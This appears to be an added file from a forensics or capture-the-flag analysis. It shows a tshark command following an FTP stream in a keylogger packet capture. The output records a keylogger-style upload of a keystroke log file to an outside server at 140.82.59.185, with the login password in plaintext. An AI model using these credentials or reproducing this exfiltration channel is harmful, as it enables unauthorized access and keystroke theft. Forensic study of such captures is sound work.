@@ -1,0 +1,51 @@
+$ tshark -r "Noobs Keylogger.pcap" -q -z follow,tcp,ascii,140.82.59.185:21,192.168.76.131:51648
+
+
+===================================================================
+Follow: tcp,ascii
+Filter: ((ip.src eq 140.82.59.185 and tcp.srcport eq 21) and (ip.dst eq 192.168.76.131 and tcp.dstport eq 51648)) or ((ip.src eq 192.168.76.131 and tcp.srcport eq 51648) and (ip.dst eq 140.82.59.185 and tcp.dstport eq 21))
+Node 0: 192.168.76.131:51648
+Node 1: 140.82.59.185:21
+	20
+220 (vsFTPd 3.0.3)
+
+16
+USER test_user
+
+	34
+331 Please specify the password.
+
+16
+PASS Nipun@123
+
+	23
+230 Login successful.
+
+10
+CWD Test
+
+	37
+250 Directory successfully changed.
+
+8
+TYPE I
+
+	31
+200 Switching to Binary mode.
+
+6
+PASV
+
+	49
+227 Entering Passive Mode (140,82,59,185,72,7).
+
+36
+STOR Keys_2018-11-28_16-04-42.html
+
+	22
+150 Ok to send data.
+
+	24
+226 Transfer complete.
+
+===================================================================
